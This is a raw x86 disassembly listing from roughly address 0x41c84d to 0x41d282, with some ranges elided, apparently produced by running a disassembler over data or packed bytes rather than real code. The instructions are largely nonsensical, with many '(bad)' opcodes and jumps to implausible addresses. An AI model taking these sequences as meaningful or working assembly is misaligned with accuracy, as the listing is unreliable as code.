  41c84d:	mov    ds:0x2438399c,eax
  41c852:	scas   eax,DWORD PTR es:[edi]
  41c853:	dec    eax
  41c854:	adc    esi,DWORD PTR [esi+0x4c]
  41c857:	push   cs
  41c858:	cdq    
  41c859:	xchg   ebp,eax
  41c85a:	xlat   BYTE PTR ds:[ebx]
  41c85b:	retf   
  41c85c:	add    ah,bl
  41c85e:	jne    0x41c848
  41c860:	xor    eax,0xd0c7d7cd
  41c865:	(bad)  
  41c866:	xor    esp,DWORD PTR [ebp+0x1a7deade]
  41c86c:	rol    BYTE PTR [esi],cl
  41c86e:	dec    eax
  41c86f:	cmp    al,al
  41c871:	test   DWORD PTR [eax-0xb],esp
  41c874:	fimul  WORD PTR [esi]
  41c876:	adc    eax,0xba27416
  41c87b:	or     bh,BYTE PTR [ecx-0x19]
  41c87e:	sbb    DWORD PTR [edx+0x27],esp
  41c881:	mov    eax,ds:0x2ceaf1b0
  41c886:	jle    0x41c83b
  41c888:	pop    eax
  41c889:	retf   
  41c88a:	shl    DWORD PTR [ebx-0x558f8650],1
  41c890:	jl     0x41c86d
  41c892:	cmp    al,0xa3
  41c894:	pop    ss
  41c895:	sub    cl,BYTE PTR [ebx+0x72a9cbac]
  41c89b:	stc    
  41c89c:	fadd   DWORD PTR ds:0x72ce283
  41c8a2:	fadd   DWORD PTR [esi+ebx*8-0x21]
  41c8a6:	call   0x6b0f:0x269cbfbf
  41c8ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c8ae:	pop    edi
  41c8af:	sub    al,0xf3
  41c8b1:	fidiv  DWORD PTR ds:0xdda03972
  41c8b7:	ret    0x2a60
  41c8ba:	mov    ds:0xcc903ca1,al
  41c8bf:	pushf  
  41c8c0:	scas   al,BYTE PTR es:[edi]
  41c8c1:	xchg   edx,eax
  41c8c2:	fs xor eax,0x994c8a43
  41c8c8:	cs loopne 0x41c88f
  41c8cb:	in     eax,0xd
  41c8cd:	add    BYTE PTR [eax+0x28],cl
  41c8d0:	pop    ebx
  41c8d1:	call   0xa5c9:0x7cfe6874
  41c8d8:	lods   eax,DWORD PTR ds:[esi]
  41c8d9:	xchg   edx,eax
  41c8da:	cmp    bh,BYTE PTR [ebx+0x29ad45b6]
  41c8e0:	or     DWORD PTR [edi+0x3c],esp
  41c8e3:	fiadd  WORD PTR [eax]
  41c8e5:	stos   BYTE PTR es:[edi],al
  41c8e6:	xor    eax,0x64d8ea74
  41c8eb:	sub    al,BYTE PTR [ebp+0x0]
	...
  41c956:	arpl   WORD PTR [ebp*4-0x44200cc],si
  41c95d:	ja     0x41c977
  41c95f:	sub    DWORD PTR [ebx],edi
  41c961:	add    DWORD PTR [esp+0x2c],ecx
  41c965:	inc    esp
  41c966:	or     esi,DWORD PTR [ebx]
  41c968:	add    DWORD PTR [eax],eax
  41c96a:	inc    DWORD PTR [eax]
  41c96c:	add    BYTE PTR [eax],al
  41c96e:	imul   edx,DWORD PTR [edx],0xe6f5491c
  41c974:	xor    eax,0xaf2fb6f9
  41c979:	bound  esi,QWORD PTR [ecx-0x5fdedbed]
  41c97f:	ss stos BYTE PTR es:[edi],al
  41c981:	aaa    
  41c982:	cwde   
  41c983:	mov    ecx,0xd76de4a5
  41c988:	cmp    al,0x67
  41c98a:	lahf   
  41c98b:	pop    edx
  41c98c:	stos   DWORD PTR es:[edi],eax
  41c98d:	push   ecx
  41c98e:	push   ss
  41c98f:	xor    eax,0x8a6fd988
  41c994:	lods   eax,DWORD PTR ds:[esi]
  41c995:	das    
  41c996:	add    DWORD PTR [eax+0x64],esi
  41c999:	jb     0x41c939
  41c99b:	imul   eax,DWORD PTR ds:0xf2fb3097,0xb5151353
  41c9a5:	pop    ebx
  41c9a6:	sbb    al,0x52
  41c9a8:	mov    BYTE PTR [edx],ah
  41c9aa:	dec    ecx
  41c9ab:	pop    es
  41c9ac:	inc    eax
  41c9ad:	rcl    DWORD PTR [ecx+edi*4],1
  41c9b0:	xchg   esp,eax
  41c9b1:	jmp    0x3e43:0xa6163b65
  41c9b8:	cmp    dl,cl
  41c9ba:	add    eax,0x898fb113
  41c9bf:	jo     0x41c97c
  41c9c1:	jg     0x41c99a
  41c9c3:	or     DWORD PTR [esi+0x6a],ebx
  41c9c6:	imul   esi,DWORD PTR [edi],0x4d226704
  41c9cc:	fisubr WORD PTR [edi-0x57603b9]
  41c9d2:	mov    dl,BYTE PTR [ebx]
  41c9d4:	push   edi
  41c9d5:	xchg   esi,eax
  41c9d6:	lods   al,BYTE PTR ds:[esi]
  41c9d7:	clc    
  41c9d8:	int3   
  41c9d9:	sub    BYTE PTR [esi],0xc5
  41c9dc:	and    eax,0x4a4f3e21
  41c9e1:	adc    edx,DWORD PTR [ebp+0x13]
  41c9e4:	cmp    BYTE PTR ds:0xa3f6bf00,bh
  41c9ea:	(bad)
  41c9ed:	adc    BYTE PTR [esi-0x11],0xb0
  41c9f1:	mov    ah,0x43
  41c9f3:	retf   
  41c9f4:	mov    esi,0x4ddfd6cd
  41c9f9:	pop    eax
  41c9fa:	and    al,0x2
  41c9fc:	aad    0x9
  41c9fe:	mov    bl,0x17
  41ca00:	dec    ebx
  41ca01:	or     eax,0x6e09bed2
  41ca06:	fwait
  41ca07:	daa    
  41ca08:	popa   
  41ca09:	dec    edi
  41ca0a:	inc    edi
  41ca0b:	sub    ebx,ebp
  41ca0d:	sbb    esp,edi
  41ca0f:	out    dx,al
  41ca10:	add    al,BYTE PTR [ecx-0x5f46d170]
  41ca16:	adc    eax,0xba7647c4
  41ca1b:	and    eax,0xf6b58490
  41ca20:	mov    esi,DWORD PTR [ecx]
  41ca22:	jp     0x41c9dc
  41ca24:	xlat   BYTE PTR ds:[ebx]
  41ca25:	jp     0x41ca0b
  41ca27:	jae    0x41ca20
  41ca29:	xlat   BYTE PTR ds:[ebx]
  41ca2a:	push   edx
  41ca2b:	jb     0x41ca63
  41ca2d:	xchg   edi,eax
  41ca2e:	ret    0x3bf5
  41ca31:	or     BYTE PTR [eax+eax*4],al
  41ca34:	std    
  41ca35:	mul    DWORD PTR [ecx+ebx*1-0xc]
  41ca39:	imul   edx,DWORD PTR [eax+0x4c],0xad395966
  41ca40:	adc    cl,bl
  41ca42:	xlat   BYTE PTR ds:[ebx]
  41ca43:	inc    esp
  41ca44:	xchg   esp,eax
  41ca45:	push   eax
  41ca46:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ca47:	call   0xf878aedc
  41ca4c:	mov    al,ds:0x96822610
  41ca51:	pop    ss
  41ca52:	inc    edx
  41ca53:	or     esp,edi
  41ca55:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ca56:	cmp    ebx,ebx
  41ca58:	cmp    al,0x9a
  41ca5a:	add    ecx,edx
  41ca5c:	ret    
  41ca5d:	cmp    eax,0x99076a92
  41ca62:	stos   BYTE PTR es:[edi],al
  41ca63:	push   esp
  41ca64:	lods   al,BYTE PTR ds:[esi]
  41ca66:	push   ds
  41ca67:	(bad)  
  41ca68:	loopne 0x41cac9
  41ca6a:	out    0x14,al
  41ca6c:	outs   dx,BYTE PTR ds:[esi]
	...
  41cad5:	add    al,dh
  41cad7:	retf   0xfc94
  41cada:	mov    esi,0xc1cef8fe
  41cadf:	or     al,BYTE PTR [ebx+0x0]
  41cae2:	imul   ebp,DWORD PTR [ebx],0x340a488f
  41cae8:	add    DWORD PTR [eax],eax
  41caea:	inc    DWORD PTR [eax]
  41caec:	add    BYTE PTR [eax],al
  41caee:	lahf   
  41caef:	push   edx
  41caf0:	cmp    dh,al
  41caf2:	and    al,0x34
  41caf4:	mov    WORD PTR [ecx],gs
  41caf6:	(bad)  
  41cafa:	std    
  41cafb:	pop    eax
  41cafc:	xor    al,0x6e
  41cafe:	adc    eax,0x6cbe8781
  41cb03:	sub    al,0xcb
  41cb05:	stc    
  41cb06:	test   BYTE PTR [ebx+ebp*2-0x76],ah
  41cb0a:	jmp    0x41cada
  41cb0c:	sbb    ecx,DWORD PTR [edi+edx*2-0x7f00bf7]
  41cb13:	ret    0x6f46
  41cb16:	repz fbstp TBYTE PTR [eax+0x4]
  41cb1a:	clc    
  41cb1b:	loope  0x41cb34
  41cb1d:	out    dx,al
  41cb1e:	inc    edx
  41cb1f:	mov    eax,edi
  41cb21:	pop    ds
  41cb22:	dec    esi
  41cb23:	stos   BYTE PTR es:[edi],al
  41cb24:	mov    esi,0x433828ba
  41cb29:	ret    
  41cb2a:	mov    esi,0x91474be3
  41cb2f:	jb     0x41cb0c
  41cb31:	and    DWORD PTR [edx],0x8c9a779a
  41cb37:	mov    eax,gs:0x43dd6c73
  41cb3d:	icebp  
  41cb3e:	adc    al,0x97
  41cb40:	ds pop ebp
  41cb42:	ror    DWORD PTR [ebp+ebx*1+0xf816001],cl
  41cb49:	rcl    ch,cl
  41cb4b:	sub    esi,esi
  41cb4d:	push   0x12
  41cb4f:	add    eax,0x851a58a4
  41cb54:	cld    
  41cb55:	test   DWORD PTR [esi+0xb],esi
  41cb58:	push   ebx
  41cb59:	sbb    DWORD PTR [ebp-0x7f],0x4b
  41cb5d:	and    DWORD PTR [ecx-0x76c4fd43],ebp
  41cb63:	cwde   
  41cb64:	test   al,0x3f
  41cb66:	adc    al,0xbf
  41cb68:	cli    
  41cb69:	sbb    ebx,ebp
  41cb6b:	test   eax,0xbe79cb1c
  41cb70:	and    eax,ecx
  41cb72:	jl     0x41cb76
  41cb74:	xor    ebp,DWORD PTR [esp+esi*1+0x51df1072]
  41cb7b:	test   DWORD PTR [ebx+0x6b513a54],esp
  41cb81:	ss jg  0x41cb3c
  41cb84:	clc    
  41cb85:	(bad)  
  41cb86:	sti    
  41cb87:	(bad)  
  41cb88:	mov    dh,0x46
  41cb8a:	mov    bh,0xed
  41cb8c:	jmp    0x41cb6d
  41cb8e:	mov    esi,0xe0c9481f
  41cb93:	mov    al,0x72
  41cb95:	cs push ss
  41cb97:	jb     0x41cbae
  41cb99:	add    edx,DWORD PTR [ecx+0x6410865]
  41cb9f:	inc    edi
  41cba0:	xchg   edx,eax
  41cba1:	mov    al,0xb
  41cba3:	jle    0x41cb32
  41cba5:	push   ecx
  41cba6:	push   ecx
  41cba7:	cmp    edi,0x15d3a949
  41cbad:	(bad)  
  41cbae:	icebp  
  41cbaf:	fisttp QWORD PTR [edx-0x1c]
  41cbb2:	mov    dh,0x36
  41cbb4:	pop    esi
  41cbb5:	(bad)  [edx]
  41cbb7:	cld    
  41cbb8:	sbb    BYTE PTR [ecx-0x5b],dl
  41cbbb:	sbb    DWORD PTR [ebx+ebp*2+0x22],edx
  41cbbf:	stos   BYTE PTR es:[edi],al
  41cbc0:	test   esp,0x691bb38
  41cbc6:	pop    ebx
  41cbc7:	or     al,0xde
  41cbc9:	sub    dl,BYTE PTR [edi+0x11]
  41cbcc:	inc    eax
  41cbcd:	or     bl,BYTE PTR [ecx-0x23]
  41cbd0:	xor    eax,0xbde6729a
  41cbd5:	leave  
  41cbd6:	jmp    0x360a65e2
  41cbdb:	(bad)  [esi+0x58]
  41cbde:	into   
  41cbdf:	fwait
  41cbe0:	mov    ds:0xc4f3f98e,eax
  41cbe5:	push   0xa8588e80
  41cbea:	test   DWORD PTR [ecx+0x36],esp
	...
  41cc54:	add    BYTE PTR [eax],al
  41cc56:	sub    esi,edx
  41cc58:	sti    
  41cc59:	pop    ebp
  41cc5a:	(bad)  
  41cc5b:	jge    0x41cc0c
  41cc5d:	neg    cl
  41cc5f:	hlt    
  41cc60:	add    eax,0x945d1e22
  41cc65:	pop    eax
  41cc66:	or     DWORD PTR ds:0xff0001,esi
  41cc6c:	add    BYTE PTR [eax],al
  41cc6e:	int    0x35
  41cc70:	pop    eax
  41cc71:	mov    ch,0xe0
  41cc73:	or     ch,BYTE PTR [ebx+0x22f5223b]
  41cc79:	rcl    DWORD PTR [ebx],0xf3
  41cc7c:	push   edi
  41cc7d:	cdq    
  41cc7e:	stos   DWORD PTR es:[edi],eax
  41cc7f:	xchg   edi,eax
  41cc80:	pop    ds
  41cc81:	mov    ds:0x3d0c2d16,eax
  41cc86:	add    dh,BYTE PTR [edi]
  41cc88:	xlat   BYTE PTR cs:[ebx]
  41cc8a:	js     0x41cc3b
  41cc8c:	xor    eax,0x43f6be9b
  41cc91:	xor    esi,edi
  41cc93:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cc94:	mov    WORD PTR [eax],ds
  41cc96:	add    ch,BYTE PTR [esi+0x1f]
  41cc99:	jmp    0x41cc56
  41cc9b:	adc    BYTE PTR [ecx-0x69f76434],bl
  41cca1:	test   al,0xc7
  41cca3:	mov    dh,0xb2
  41cca5:	add    bl,BYTE PTR ds:0xd849a2de
  41ccab:	(bad)  
  41ccac:	mov    edi,0xebd704a0
  41ccb1:	cld    
  41ccb2:	scas   al,BYTE PTR es:[edi]
  41ccb3:	xor    eax,0xa6377271
  41ccb8:	mov    ecx,0x42e0d2bb
  41ccbd:	cli    
  41ccbe:	out    dx,al
  41ccbf:	mov    al,ds:0x114e3dfe
  41ccc4:	stos   DWORD PTR es:[edi],eax
  41ccc5:	(bad)  
  41ccc6:	gs cmp dl,bh
  41ccc9:	pop    edi
  41ccca:	jmp    0xa099becc
  41cccf:	lea    ecx,[esi-0x3e]
  41ccd2:	pop    ebp
  41ccd3:	adc    cl,0x82
  41ccd6:	loope  0x41cd29
  41ccd8:	mov    cl,0x38
  41ccda:	push   edx
  41ccdb:	fs enter 0xef45,0x92
  41cce0:	push   ebx
  41cce1:	add    al,0x54
  41cce3:	test   eax,0xf5087547
  41cce8:	dec    edx
  41cce9:	push   0xcea7a16d
  41ccee:	jl     0x41cccc
  41ccf0:	sub    BYTE PTR [edx-0x4d],dh
  41ccf3:	stc    
  41ccf4:	lods   al,BYTE PTR ds:[esi]
  41ccf5:	inc    edx
  41ccf6:	jg     0x41cd08
  41ccf8:	aam    0x97
  41ccfa:	in     eax,0x5f
  41ccfc:	icebp  
  41ccfd:	jne    0x41cd6b
  41ccff:	aas    
  41cd00:	push   esi
  41cd01:	popf   
  41cd02:	jecxz  0x41cd09
  41cd04:	jmp    0x6fdd4e66
  41cd09:	test   al,0x39
  41cd0b:	cld    
  41cd0c:	out    dx,al
  41cd0d:	aam    0x51
  41cd0f:	sub    esi,DWORD PTR [ebx]
  41cd11:	or     DWORD PTR [eax-0x60],0x2e82cd3d
  41cd18:	cmp    DWORD PTR [ebx+0x5044cde8],edi
  41cd1e:	pop    ecx
  41cd1f:	out    0x10,al
  41cd21:	cmp    dl,BYTE PTR [ecx+0x3267e236]
  41cd27:	jle    0x41cd77
  41cd29:	adc    edi,DWORD PTR [edi+ebx*1]
  41cd2c:	in     al,0xd8
  41cd2e:	daa    
  41cd2f:	retf   
  41cd30:	pushf  
  41cd31:	outs   dx,BYTE PTR ds:[esi]
  41cd32:	xchg   ecx,eax
  41cd33:	dec    edi
  41cd34:	mov    ebp,DWORD PTR [ecx+eax*2+0x57]
  41cd38:	and    cl,ah
  41cd3a:	loop   0x41ccca
  41cd3c:	fcmovb st,st(0)
  41cd3e:	add    al,0x28
  41cd40:	fistp  DWORD PTR [edi+0x5bbd1b6a]
  41cd46:	push   esi
  41cd47:	mov    ebp,0xfc76e355
  41cd4c:	test   dl,ch
  41cd4e:	inc    ebx
  41cd4f:	pop    esp
  41cd50:	jl     0x41cd29
  41cd52:	xor    al,0xd9
  41cd54:	test   eax,0x196aa6a8
  41cd59:	retf   
  41cd5a:	cmp    DWORD PTR [edx],edi
  41cd5c:	pop    eax
  41cd5d:	cmp    DWORD PTR [ecx+esi*1],edx
  41cd60:	stc    
  41cd61:	adc    DWORD PTR [ebx+eax*1+0x70aa3846],edx
  41cd68:	push   cs
  41cd69:	fcomp  DWORD PTR [ebx+eiz*8-0x16]
	...
  41cdd5:	add    BYTE PTR [eax-0x67],ah
  41cdd8:	fsubr  st(5),st
  41cdda:	std    
  41cddb:	in     eax,0x79
  41cddd:	popf   
  41cdde:	in     al,dx
  41cddf:	stc    
  41cde0:	jmp    0x41ce12
  41cde2:	mov    bl,0xe
  41cde4:	popa   
  41cde5:	sbb    DWORD PTR [eax],ecx
  41cde7:	add    DWORD PTR ss:[eax],eax
  41cdea:	inc    DWORD PTR [eax]
  41cdec:	add    BYTE PTR [eax],al
  41cdee:	pusha  
  41cdef:	mov    bh,0x5f
  41cdf1:	sbb    al,0x74
  41cdf3:	fdivr  QWORD PTR [edi+0x3f2e5674]
  41cdf9:	out    0x37,al
  41cdfb:	adc    cl,ch
  41cdfd:	nop
  41cdfe:	data16 test dh,ch
  41ce01:	sbb    al,BYTE PTR [esi-0x104eb289]
  41ce07:	jmp    0xd56374da
  41ce0c:	pop    esi
  41ce0d:	cli    
  41ce0e:	add    bh,bh
  41ce10:	push   es
  41ce11:	stos   DWORD PTR es:[edi],eax
  41ce12:	push   DWORD PTR [ecx+ebx*1]
  41ce15:	jmp    0x41ce4d
  41ce17:	imul   edx,DWORD PTR [eax-0xd9edf43],0xe7a984b9
  41ce21:	mov    ds:0x360ed98b,al
  41ce26:	xchg   BYTE PTR [ebp+0x5f],dl
  41ce29:	test   eax,0xec1dd27
  41ce2e:	stos   BYTE PTR es:[edi],al
  41ce2f:	(bad)  
  41ce30:	clc    
  41ce31:	mov    ebp,0x46ec5930
  41ce36:	mov    edi,0x7cf8f0f7
  41ce3b:	icebp  
  41ce3c:	call   0x4f31:0x5383d752
  41ce43:	mov    esi,0xa3d58a87
  41ce48:	inc    ch
  41ce4a:	nop
  41ce4b:	iret   
  41ce4c:	add    eax,0x96244efd
  41ce51:	sub    BYTE PTR [ecx+0x77],ah
  41ce54:	ds dec ebx
  41ce56:	jge    0x41ce31
  41ce58:	push   es
  41ce59:	aas    
  41ce5a:	add    al,0xae
  41ce5c:	outs   dx,BYTE PTR ds:[esi]
  41ce5d:	pop    ss
  41ce5e:	mov    esi,0x938f10e9
  41ce63:	mov    ecx,0xb967e66f
  41ce68:	(bad)  
  41ce6a:	add    eax,0x416108fd
  41ce6f:	mov    ch,0x2b
  41ce71:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ce72:	add    al,0x97
  41ce74:	inc    eax
  41ce75:	mov    al,ds:0x7b91de93
  41ce7a:	mov    dh,0x4d
  41ce7c:	sub    BYTE PTR [edi-0x14699f33],bl
  41ce82:	pushf  
  41ce83:	fldcw  WORD PTR [ebx-0x34407c5f]
  41ce89:	sub    ecx,DWORD PTR [esi]
  41ce8b:	cmp    eax,0x5166f17a
  41ce90:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ce91:	mov    eax,ds:0xad5665cb
  41ce96:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ce97:	add    DWORD PTR [ebx+edi*2+0x2c1f9d58],edi
  41ce9e:	mov    fs,WORD PTR [ebp+0x6d04ce3]
  41cea4:	jle    0x41cf1e
  41cea6:	inc    ecx
  41cea7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cea8:	push   ss
  41cea9:	push   cs
  41ceaa:	(bad)  
  41ceab:	jb     0x41cec4
  41cead:	cs pop es
  41ceaf:	daa    
  41ceb0:	mov    ds,WORD PTR [ebx+0x39078957]
  41ceb6:	mov    eax,0x1ad78df1
  41cebb:	pop    ebx
  41cebc:	icebp  
  41cebd:	sub    eax,0xab4a775a
  41cec2:	dec    esi
  41cec3:	lds    edi,FWORD PTR [edx]
  41cec5:	cmp    ch,BYTE PTR [eax+0x27]
  41cec8:	leave  
  41cec9:	cmp    ecx,edi
  41cecb:	mov    ebx,0xfa3a69eb
  41ced0:	push   esi
  41ced1:	add    al,0xae
  41ced3:	ror    DWORD PTR [ebx],0x4f
  41ced6:	clc    
  41ced7:	jmp    0xedb776a2
  41cedc:	shl    eax,0xd5
  41cedf:	arpl   WORD PTR [esi+0x170aeb4d],ax
  41cee5:	js     0x41ce99
  41cee7:	retf   
  41cee8:	outs   dx,BYTE PTR ds:[esi]
  41cee9:	or     esp,DWORD PTR [ebx-0x3d]
  41ceec:	jno    0x41ceee
	...
  41cf56:	pop    es
  41cf57:	jp     0x41cf41
  41cf59:	jnp    0x41cf58
  41cf5b:	sti    
  41cf5c:	xchg   edi,eax
  41cf5d:	jle    0x41cfa6
  41cf5f:	jp     0x41cf3b
  41cf61:	lods   al,BYTE PTR ds:[esi]
  41cf62:	das    
  41cf63:	das    
  41cf64:	ins    BYTE PTR es:[edi],dx
  41cf65:	adc    eax,DWORD PTR [edi]
  41cf67:	aaa    
  41cf68:	add    DWORD PTR [eax],eax
  41cf6a:	inc    DWORD PTR [eax]
  41cf6c:	add    BYTE PTR [eax],al
  41cf6e:	mov    bh,0x7a
  41cf70:	je     0x41cfc6
  41cf72:	loopne 0x41cfc5
  41cf74:	cdq    
  41cf75:	xchg   edx,eax
  41cf76:	inc    esp
  41cf77:	jp     0x41cf88
  41cf79:	fsubr  st(2),st
  41cf7b:	add    bh,BYTE PTR [esi+ebx*4+0x36]
  41cf7f:	aaa    
  41cf80:	aas    
  41cf81:	inc    edi
  41cf82:	push   cs
  41cf83:	test   al,0x3d
  41cf85:	loope  0x41cfd3
  41cf87:	call   0x8550de8b
  41cf8c:	sbb    al,0xa7
  41cf8e:	ret    
  41cf8f:	sub    al,0xe
  41cf91:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cf92:	mov    esi,0xce59bc4e
  41cf97:	mov    edi,0x72fa4353
  41cf9c:	dec    edi
  41cf9d:	iret   
  41cf9e:	jnp    0x41cfc3
  41cfa0:	lock jbe 0x41cff7
  41cfa3:	pminsw mm4,mm2
  41cfa6:	adc    BYTE PTR [esi],0x6e
  41cfa9:	sti    
  41cfaa:	jmp    0xe2f695f1
  41cfaf:	cmp    bl,dh
  41cfb1:	js     0x41cf39
  41cfb3:	fs and esp,ecx
  41cfb6:	sar    bh,1
  41cfb8:	rcr    BYTE PTR [eax-0x4222d8f],0x60
  41cfbf:	leave  
  41cfc0:	pop    esi
  41cfc1:	push   edx
  41cfc2:	mov    al,0x58
  41cfc4:	xor    edx,DWORD PTR [edi-0x18]
  41cfc7:	xchg   ebx,eax
  41cfc8:	mov    eax,ds:0x81bd012e
  41cfcd:	aaa    
  41cfce:	xor    eax,0xbd0ee919
  41cfd3:	xor    ah,BYTE PTR [ebp+0x477a53ff]
  41cfd9:	pop    eax
  41cfda:	and    eax,0x56910fd6
  41cfdf:	mov    dl,0xa5
  41cfe1:	stos   DWORD PTR es:[edi],eax
  41cfe2:	aad    0x8c
  41cfe4:	lahf   
  41cfe5:	inc    esp
  41cfe6:	and    BYTE PTR [edx+0x49a74c5d],bl
  41cfec:	mov    dh,0x6e
  41cfee:	xchg   ebp,eax
  41cfef:	(bad)  
  41cff0:	push   ecx
  41cff1:	and    BYTE PTR [edx+eax*2-0x14],bh
  41cff5:	sub    dl,bl
  41cff7:	mov    esp,0x92a734aa
  41cffc:	inc    esp
  41cffd:	sbb    esi,DWORD PTR [ebp-0x70]
  41d000:	and    al,0x32
  41d002:	mov    ch,0x47
  41d004:	mov    cl,BYTE PTR [eax-0x2b]
  41d007:	sahf   
  41d008:	retf   0x3e
  41d00b:	test   DWORD PTR [edx],esp
  41d00d:	cmp    cl,BYTE PTR [ebx]
  41d00f:	ja     0x41d05b
  41d011:	xor    dh,BYTE PTR [edx+0x25]
  41d014:	loop   0x41cfe7
  41d016:	mov    ch,dl
  41d018:	mov    ch,BYTE PTR [edx+0x7576fb42]
  41d01e:	outs   dx,BYTE PTR ds:[esi]
  41d01f:	xor    BYTE PTR [edx+0x65],dl
  41d022:	cmp    dl,al
  41d024:	adc    al,0x68
  41d026:	xchg   esi,eax
  41d027:	xor    DWORD PTR [ebx+ebx*1],edx
  41d02a:	inc    ebp
  41d02b:	and    al,0xf9
  41d02d:	mov    ebx,0xb714dde7
  41d032:	ficom  DWORD PTR [esi]
  41d034:	mov    edi,0x4491f759
  41d039:	mov    edx,es
  41d03b:	leave  
  41d03c:	out    dx,eax
  41d03d:	arpl   WORD PTR [ecx-0x5e6778f9],di
  41d043:	dec    esp
  41d044:	sub    DWORD PTR [esi+0x1d],ebp
  41d047:	mov    BYTE PTR [ebp+0x1f],bh
  41d04a:	adc    bl,BYTE PTR [ecx+0x12cadb8f]
  41d050:	sti    
  41d051:	rdtsc  
  41d053:	mov    edx,0x462836c3
  41d058:	xchg   edi,eax
  41d059:	fstp   DWORD PTR [esi-0x7f]
  41d05c:	les    ebx,FWORD PTR [edx+0x78]
  41d05f:	xor    BYTE PTR [ebp+0x3bb4e126],cl
  41d065:	pop    ecx
  41d066:	dec    ebp
  41d067:	jmp    0x8c30378
  41d06c:	mov    ebp,0x0
	...
  41d0d5:	add    BYTE PTR [ecx-0x52bcdfcc],bh
  41d0db:	push   edi
  41d0dc:	sti    
  41d0dd:	dec    BYTE PTR [esi-0x1b]
  41d0e0:	mov    ebp,0x4036acbd
  41d0e5:	jg     0x41d0ed
  41d0e7:	cmp    BYTE PTR [ecx],al
  41d0e9:	add    bh,bh
  41d0eb:	add    BYTE PTR [eax],al
  41d0ed:	add    BYTE PTR [ebp+0x78],bl
  41d0f0:	cmc    
  41d0f1:	xchg   bl,al
  41d0f3:	adc    eax,0x9ff1a2c5
  41d0f8:	push   ss
  41d0f9:	loop   0x41d0a2
  41d0fb:	jno    0x41d11a
  41d0fd:	(bad)  
  41d0fe:	scas   eax,DWORD PTR es:[edi]
  41d0ff:	loopne 0x41d157
  41d101:	inc    esi
  41d102:	jp     0x41d0d0
  41d104:	add    bh,al
  41d106:	push   ds
  41d107:	add    BYTE PTR [eax],dh
  41d109:	mov    eax,0x30f33ebd
  41d10e:	adc    DWORD PTR [ecx],edi
  41d110:	jnp    0x41d12a
  41d112:	mov    WORD PTR ds:0x6ff6241a,es
  41d118:	cmp    DWORD PTR [esi+edi*2+0x26e17dd8],ecx
  41d11f:	dec    esp
  41d120:	loope  0x41d0d1
  41d122:	iret   
  41d123:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d124:	sub    eax,0x67722049
  41d129:	clc    
  41d12a:	icebp  
  41d12b:	or     BYTE PTR [ebx+0x14],0x53
  41d12f:	pop    eax
  41d130:	ins    DWORD PTR es:[edi],dx
  41d131:	(bad)  
  41d132:	adc    al,BYTE PTR ds:0xb2d9ccbb
  41d138:	cdq    
  41d139:	inc    edi
  41d13a:	sub    BYTE PTR [ebp+ebp*1+0x558683d8],bh
  41d141:	push   ebp
  41d142:	sbb    al,0x31
  41d144:	adc    BYTE PTR [ebp-0x7345128c],cl
  41d14a:	je     0x41d110
  41d14c:	pop    ss
  41d14d:	loope  0x41d15a
  41d14f:	push   es
  41d150:	xor    DWORD PTR [esi],esp
  41d152:	repnz mov dl,0x3d
  41d155:	sub    edx,DWORD PTR [ebp+0x234139b]
  41d15b:	push   ss
  41d15c:	mov    ah,0x28
  41d15e:	ja     0x41d173
  41d160:	xchg   edx,eax
  41d161:	(bad)  
  41d162:	adc    eax,0x75cd0c6c
  41d167:	shl    DWORD PTR ds:0x6321c23b,0xf
  41d16e:	inc    ebp
  41d16f:	inc    edi
  41d170:	add    BYTE PTR [ebx],bh
  41d172:	jmp    0xb4d3:0x62106209
  41d179:	cmp    BYTE PTR [edx-0x326e0d9e],al
  41d17f:	and    BYTE PTR [esi],ch
  41d181:	(bad)  
  41d182:	ja     0x41d113
  41d184:	push   esi
  41d185:	sub    bh,dh
  41d187:	push   edx
  41d188:	mov    ch,0x48
  41d18a:	ror    BYTE PTR [edx],1
  41d18c:	sar    DWORD PTR ds:0xc3119bc8,0x7
  41d193:	arpl   WORD PTR [eiz*4-0x6da9b9d3],di
  41d19a:	xchg   edi,eax
  41d19b:	cld    
  41d19c:	and    BYTE PTR [esi+0x6d829f31],bl
  41d1a2:	std    
  41d1a3:	ret    0xc102
  41d1a6:	inc    edx
  41d1a7:	mov    ecx,DWORD PTR [esi+0x7c06c3b2]
  41d1ad:	int    0x9d
  41d1af:	jg     0x41d164
  41d1b1:	pushf  
  41d1b2:	(bad)  
  41d1b3:	cmp    DWORD PTR [edi-0x3d46d6ec],esi
  41d1b9:	or     DWORD PTR [bp+si+0x4a],ebx
  41d1bd:	add    eax,0x5fdcd5d1
  41d1c2:	test   ebp,ebx
  41d1c4:	out    0x25,eax
  41d1c6:	stc    
  41d1c7:	mov    esp,0x6969844e
  41d1cc:	jle    0x41d159
  41d1ce:	aas    
  41d1cf:	loopne 0x41d17e
  41d1d1:	addr16 pop ebx
  41d1d4:	xlat   BYTE PTR ds:[ebx]
  41d1d5:	push   esi
  41d1d6:	xchg   DWORD PTR [ecx+0x7d38d1d9],esp
  41d1dc:	mov    ds:0x9c81ada1,al
  41d1e1:	jno    0x41d1f4
  41d1e3:	jns    0x41d17e
  41d1e5:	xlat   BYTE PTR ds:[ebx]
  41d1e6:	shr    DWORD PTR [esp+ecx*8-0x7b84ae6d],0x0
	...
  41d256:	push   eax
  41d257:	ret    
  41d258:	cmp    ecx,DWORD PTR ds:0xdf76fdbb
  41d25e:	xor    DWORD PTR [ebp-0x7],esp
  41d261:	hlt    
  41d262:	adc    ebp,ecx
  41d264:	aaa    
  41d265:	pushf  
  41d266:	add    eax,0xff000139
  41d26b:	add    BYTE PTR [eax],al
  41d26d:	add    BYTE PTR [edi],bl
  41d26f:	jbe    0x41d1f9
  41d271:	pop    edx
  41d272:	xchg   ebp,eax
  41d273:	rcl    al,cl
  41d275:	test   BYTE PTR [eax+0x38],al
  41d278:	sub    al,0x95
  41d27a:	ror    al,cl
  41d27c:	inc    eax
  41d27d:	into   
  41d27e:	cwde   
  41d27f:	inc    DWORD PTR [eax+0x61]
  41d282:	sbb    DWORD PTR [edx],ecx
